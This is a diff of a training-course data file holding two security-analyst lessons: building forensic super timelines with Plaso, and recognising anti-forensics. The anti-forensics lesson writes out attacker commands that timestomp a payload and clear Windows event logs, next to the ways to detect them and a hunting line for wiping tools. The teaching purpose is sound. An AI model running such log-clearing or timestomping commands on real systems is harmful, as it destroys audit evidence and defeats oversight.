+A single artifact tells a story. A timeline tells THE story.
+
+\`\`\`
+Without Timeline:
+"PowerShell executed on host" — So what?
+
+With Timeline:
+14:30 — Phishing email received
+14:32 — User clicked malicious link
+14:33 — Macro executed, dropped payload to %TEMP%
+14:34 — PowerShell launched, downloaded second stage
+14:35 — Scheduled task created for persistence
+14:40 — Lateral movement to DC via PsExec
+14:45 — Credential dumping with Mimikatz
+14:50 — Data staging began on file share
+\`\`\`
+
+## Building a Super Timeline with Plaso
+
+### What is Plaso/log2timeline?
+Plaso extracts timestamps from 100+ artifact types and merges them into a single timeline:
+
+### Artifact Sources
+| Source | Timestamps Extracted |
+|--------|---------------------|
+| File system | Created, modified, accessed, MFT changed |
+| Event logs | Event timestamps |
+| Registry | Last write times |
+| Browser history | Visit times, download times |
+| Prefetch | Execution times |
+| LNK files | Access times, target timestamps |
+| USB artifacts | Connection/disconnection times |
+| Email | Sent, received, read times |
+
+### Creating a Super Timeline
+\`\`\`bash
+# Step 1: Process the disk image
+log2timeline.py --storage-file timeline.plaso /evidence/disk.E01
+
+# Step 2: Filter the timeline
+psort.py -o l2tcsv timeline.plaso \
+  "date > '2024-12-14 00:00:00' AND date < '2024-12-16 00:00:00'" \
+  -w filtered_timeline.csv
+
+# Step 3: Analyze in Timeline Explorer
+# Open filtered_timeline.csv in Eric Zimmerman's Timeline Explorer
+\`\`\`
+
+## Timeline Analysis Techniques
+
+### Pivot Points
+Start from known events and expand outward:
+\`\`\`
+Known: Malware detected at 14:34
+    ↑ Look backward: How did it get there?
+    ↓ Look forward: What did it do after?
+\`\`\`
+
+### Pattern Recognition
+- **Rapid file creation** — Malware deployment or data staging
+- **Off-hours activity** — Attacker working outside business hours
+- **Timestamp gaps** — Possible log clearing or timestomping
+- **Repetitive patterns** — Automated tools or scripts
+
+### Correlation Across Sources
+\`\`\`
+14:33:12 [Prefetch] — POWERSHELL.EXE executed
+14:33:14 [EventLog] — Event 4104: Script block logged
+14:33:15 [FileSystem] — payload.exe created in %TEMP%
+14:33:16 [Registry] — Run key added for persistence
+14:33:18 [Network] — Connection to 198.51.100.23:443
+\`\`\`
+
+## Tools for Timeline Analysis
+
+| Tool | Purpose |
+|------|---------|
+| log2timeline/Plaso | Generate super timelines |
+| Timeline Explorer | GUI analysis (Eric Zimmerman) |
+| Timesketch | Web-based collaborative analysis |
+| Excel/Sheets | Simple filtering and pivoting |
+
+## Best Practices
+- Always work in UTC
+- Define your time window before starting
+- Start from known events and expand
+- Document your pivot points and reasoning
+- Export filtered views for reports
+- Color-code different event sources for visual analysis
+    `,
+    keyTakeaways: [
+      "Super timelines combine 100+ artifact types into one chronological view",
+      "Plaso/log2timeline is the standard tool for super timeline creation",
+      "Start analysis from known events and expand outward",
+      "Correlate file system, event log, registry, and network timestamps",
+      "Always work in UTC and document your pivot points"
+    ],
+  },
+  {
+    id: "9.4",
+    courseId: "soc-analyst-path",
+    title: "Anti-Forensics & Evidence Destruction",
+    content: `
+# Anti-Forensics & Evidence Destruction
+
+Sophisticated attackers actively destroy evidence. Understanding anti-forensic techniques helps analysts recognize when evidence has been tampered with.
+
+## Anti-Forensic Categories
+
+\`\`\`
+Anti-Forensics
+├── Evidence Destruction — Deleting logs, wiping files
+├── Evidence Hiding — Steganography, ADS, slack space
+├── Evidence Tampering — Timestomping, log modification
+├── Trail Obfuscation — Proxies, living-off-the-land, encryption
+└── Detection Evasion — Fileless malware, memory-only tools
+\`\`\`
+
+## Timestomping
+
+Modifying file timestamps to blend in:
+\`\`\`powershell
+# Attacker changes timestamps to match system files
+(Get-Item payload.exe).CreationTime = "2024-01-15 08:30:00"
+(Get-Item payload.exe).LastWriteTime = "2024-01-15 08:30:00"
+(Get-Item payload.exe).LastAccessTime = "2024-01-15 08:30:00"
+\`\`\`
+
+### Detection
+- Compare $STANDARD_INFORMATION timestamps with $FILE_NAME timestamps in MFT
+- $FILE_NAME timestamps are harder to modify
+- If $SI timestamps are older than $FN timestamps → likely timestomped
+
+\`\`\`
+$STANDARD_INFORMATION: Created 2024-01-15 (looks old)
+$FILE_NAME:            Created 2024-12-15 (actual creation)
+→ TIMESTOMPING DETECTED
+\`\`\`
+
+## Log Clearing
+
+### Windows Event Log Clearing
+\`\`\`powershell
+# Attacker clears logs
+wevtutil cl Security
+wevtutil cl System
+Clear-EventLog -LogName Security
+\`\`\`
+
+### Detection
+- Event ID **1102** — Security audit log was cleared
+- Event ID **104** — System log was cleared
+- Gaps in Event Record IDs indicate deleted entries
+- Sudden drop in log volume
+
+## Secure Deletion
+
+### Tools Attackers Use
+- SDelete (Sysinternals) — Securely overwrites files
+- cipher /w — Wipes free space on NTFS
+- shred (Linux) — Overwrite and delete
+
+### What Survives
+- USN Journal entries (records the deletion)
+- Prefetch files (records execution of deletion tools)
+- MFT entries (may retain filename even after data overwrite)
+- Volume Shadow Copies (if not also deleted)
+
+## Fileless Malware
+
+Operates entirely in memory, leaving minimal disk artifacts:
+
+\`\`\`
+Delivery: PowerShell download cradle
+Execution: Reflective DLL injection (memory only)
+Persistence: WMI event subscription or scheduled task
+C2: Uses legitimate services (DNS, HTTPS)
+\`\`\`
+
+### Detection Approaches
+- Script Block Logging captures PowerShell commands
+- ETW (Event Tracing for Windows) captures .NET activity
+- Memory forensics reveals injected code
+- EDR behavioral detection catches suspicious API calls
+
+## Evidence Recovery Techniques
+
+### Recovering Cleared Logs
+- Check Volume Shadow Copies for log backups
+- SIEM retains forwarded copies of events
+- Check other systems (domain controllers replicate some events)
+
+### Recovering Deleted Files
+- Carve unallocated space for file signatures
+- Check Recycle Bin ($Recycle.Bin)
+- Parse $UsnJrnl for deletion records
+- Volume Shadow Copies may contain previous versions
+
+### Detecting Anti-Forensic Tool Usage
+\`\`\`
+# Hunt for anti-forensic tools in Prefetch
+dir C:\\Windows\\Prefetch\\*.pf | findstr /i "sdelete cipher eraser ccleaner bleachbit"
+
+# Check for log clearing events
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=1102}
+\`\`\`
+
+## Key Principle
+> Anti-forensics creates artifacts of its own. The act of destroying evidence leaves traces that a skilled analyst can find.
+    `,
+    keyTakeaways: [
+      "Timestomping is detected by comparing $SI and $FN timestamps in MFT",
+      "Event ID 1102 records when the Security log is cleared",
+      "Secure deletion tools leave traces in Prefetch and USN Journal",
+      "Fileless malware requires memory forensics and script block logging",
+      "Anti-forensics creates its own artifacts — the cover-up leaves traces"
+    ],
+  },
 ];
 
 export const getLessonContent = (courseId: string, lessonId: string): LessonContent | undefined => {
